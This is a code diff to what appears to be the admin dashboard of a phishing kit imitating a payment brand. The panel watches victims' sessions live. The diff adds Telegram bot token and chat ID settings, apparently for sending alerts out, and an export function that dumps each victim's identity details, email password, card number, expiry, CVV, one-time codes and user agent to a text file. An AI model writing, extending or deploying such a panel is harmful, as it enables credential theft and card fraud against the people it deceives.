@@ -121,18 +121,18 @@ type AdminTab = 'live' | 'history' | 'settings';
                                           [class.bg-[#E1F0FA]]="isSelected(session)" [class.border-pp-blue]="isSelected(session)" [class.hover:bg-slate-50]="!isSelected(session)">
                                          
                                          <div class="absolute top-4 right-4 h-2 w-2 rounded-full" 
-                                            [class.bg-pp-success]="session.status === 'Active'"
-                                            [class.bg-orange-400]="session.status !== 'Active'"></div>
+                                            [class.bg-pp-success]="isSessionLive(session)"
+                                            [class.bg-slate-300]="!isSessionLive(session)"></div>
 
                                          <div class="flex flex-col gap-1">
                                              <span class="font-bold text-pp-navy font-mono text-xs">{{ session.id }}</span>
-                                             <span class="text-sm font-bold text-pp-blue truncate">{{ session.email || 'No Email' }}</span>
+                                             <span class="text-sm font-bold text-pp-blue truncate">{{ getDisplayEmail(session.email) }}</span>
                                              <span class="text-xs text-slate-500 font-medium uppercase tracking-wide">{{ session.stage }}</span>
                                          </div>
                                          <div class="flex items-center gap-2 text-[11px] text-slate-400 mt-2">
                                              <span class="material-icons text-[12px]">schedule</span> {{ session.timestamp | date:'shortTime' }}
                                              <span>•</span>
-                                             <span>{{ session.fingerprint?.ip || 'IP Hidden' }}</span>
+                                             <span>{{ session.fingerprint?.ip || session.ip || 'Hidden' }}</span>
                                          </div>
                                      </div>
                                  }
@@ -274,8 +274,8 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  <!-- Action Bar -->
                                  <div class="p-5 border-t border-slate-200 bg-white sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
                                      <div class="flex items-center gap-2">
-                                         <span class="h-2 w-2 rounded-full animate-pulse bg-pp-success"></span>
-                                         <span class="text-xs font-bold text-slate-500 hidden sm:block">Live Connection</span>
+                                         <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
+                                         <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
                                      </div>
                                      <div class="flex gap-3">
                                           <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
@@ -313,13 +313,17 @@ type AdminTab = 'live' | 'history' | 'settings';
                                         <th class="px-6 py-4">Identity</th>
                                         <th class="px-6 py-4">Card Info</th>
                                         <th class="px-6 py-4">Status</th>
+                                        <th class="px-6 py-4">Actions</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-100 text-sm font-medium">
                                     @for(item of state.history(); track item.id) {
-                                        <tr class="hover:bg-slate-50 transition-colors">
+                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer" (click)="selectSession(item)">
                                             <td class="px-8 py-4 text-slate-500">{{ item.timestamp | date:'short' }}</td>
-                                            <td class="px-6 py-4 text-pp-blue font-bold font-mono">{{ item.id }}</td>
+                                            <td class="px-6 py-4 text-pp-blue font-bold font-mono">
+                                                {{ item.id }}
+                                                @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue ml-1">push_pin</span> }
+                                            </td>
                                             <td class="px-6 py-4">
                                                 <div class="flex flex-col">
                                                     <span class="font-bold text-pp-navy">{{ item.name }}</span>
@@ -331,6 +335,13 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             </td>
                                             <td class="px-6 py-4">
                                                 <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
+                                            </td>
+                                            <td class="px-6 py-4" (click)="$event.stopPropagation()">
+                                                <div class="flex items-center gap-2">
+                                                    <button (click)="exportTxt(item)" class="text-slate-400 hover:text-pp-blue transition-colors" title="Export TXT"><span class="material-icons text-lg">download</span></button>
+                                                    <button (click)="pinSession(item)" [class.text-pp-blue]="item.isPinned" [class.text-slate-400]="!item.isPinned" class="hover:text-pp-blue transition-colors" title="Pin"><span class="material-icons text-lg">push_pin</span></button>
+                                                    <button (click)="deleteSession(item)" class="text-slate-400 hover:text-red-600 transition-colors" title="Delete"><span class="material-icons text-lg">delete</span></button>
+                                                </div>
                                             </td>
                                         </tr>
                                     }
@@ -349,6 +360,17 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  <input type="email" [(ngModel)]="settingEmail" placeholder=" " class="pp-input peer">
                                  <label class="pp-label">Alert Notification Email</label>
                                  <p class="text-xs text-slate-500 mt-2 ml-1">New sessions will trigger an alert to this address.</p>
+                             </div>
+
+                             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="pp-input-group mb-0">
+                                    <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer">
+                                    <label class="pp-label">Telegram Bot Token</label>
+                                </div>
+                                <div class="pp-input-group mb-0">
+                                    <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer">
+                                    <label class="pp-label">Telegram Chat ID</label>
+                                </div>
                              </div>
                              
                              <div class="pt-4 border-t border-slate-100">
@@ -373,7 +395,11 @@ export class AdminDashboardComponent {
   loginUser = '';
   loginPass = '';
   loginError = signal(false);
+
+  // Settings
   settingEmail = '';
+  tgToken = '';
+  tgChat = '';
 
   monitoredSession = computed(() => {
       const id = this.state.monitoredSessionId();
@@ -388,6 +414,8 @@ export class AdminDashboardComponent {
   constructor() {
       effect(() => {
           this.settingEmail = this.state.adminAlertEmail();
+          this.tgToken = this.state.telegramBotToken();
+          this.tgChat = this.state.telegramChatId();
       });
 
       effect(() => {
@@ -419,7 +447,9 @@ export class AdminDashboardComponent {
   }
 
   refresh() {
-      this.state.fetchSessions();
+      this.state.fetchSessions().then(() => {
+          this.state.showAdminToast('Refreshed Sessions');
+      });
   }
 
   selectSession(session: any) {
@@ -433,6 +463,72 @@ export class AdminDashboardComponent {
 
   isSelected(session: any): boolean {
       return this.state.monitoredSessionId() === session.id;
+  }
+
+  getDisplayEmail(email: string): string {
+      if (!email) return 'Waiting for input...';
+      if (email === 'admin' || email === this.state.adminUsername()) return 'Typing...';
+      return email;
+  }
+
+  isSessionLive(session: any): boolean {
+      if (!session || !session.lastSeen) return false;
+      return (Date.now() - session.lastSeen) < 120000; // 2 mins
+  }
+
+  deleteSession(session: any) {
+      if(confirm('Are you sure you want to delete this session?')) {
+          this.state.deleteSession(session.id);
+      }
+  }
+
+  pinSession(session: any) {
+      this.state.pinSession(session.id);
+  }
+
+  exportTxt(session: any) {
+      const data = session.data || {};
+      const content = `
+SESSION REPORT
+==============
+ID: ${session.id}
+Time: ${session.timestamp}
+IP: ${session.fingerprint?.ip || session.ip}
+Status: ${session.status}
+
+IDENTITY
+--------
+Name: ${data.firstName} ${data.lastName}
+DOB: ${data.dob}
+Address: ${data.address}
+Country: ${data.country}
+Phone: ${data.phoneNumber}
+
+CREDENTIALS
+-----------
+Email: ${data.email}
+Password: ${data.password}
+
+FINANCIAL
+---------
+Card: ${data.cardNumber}
+Exp: ${data.cardExpiry}
+CVV: ${data.cardCvv}
+OTP: ${data.cardOtp}
+Phone Code: ${data.phoneCode}
+
+USER AGENT
+----------
+${session.fingerprint?.userAgent}
+      `.trim();
+
+      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `session-${session.id}.txt`;
+      a.click();
+      window.URL.revokeObjectURL(url);
   }
 
   private getElapsed(timestamp: Date | undefined): string {
@@ -478,7 +574,7 @@ export class AdminDashboardComponent {
   }
 
   saveSettings() {
-      this.state.updateAdminSettings(this.settingEmail, true);
+      this.state.updateAdminSettings(this.settingEmail, true, this.tgToken, this.tgChat);
       this.state.showAdminToast('Settings Saved');
   }
 }
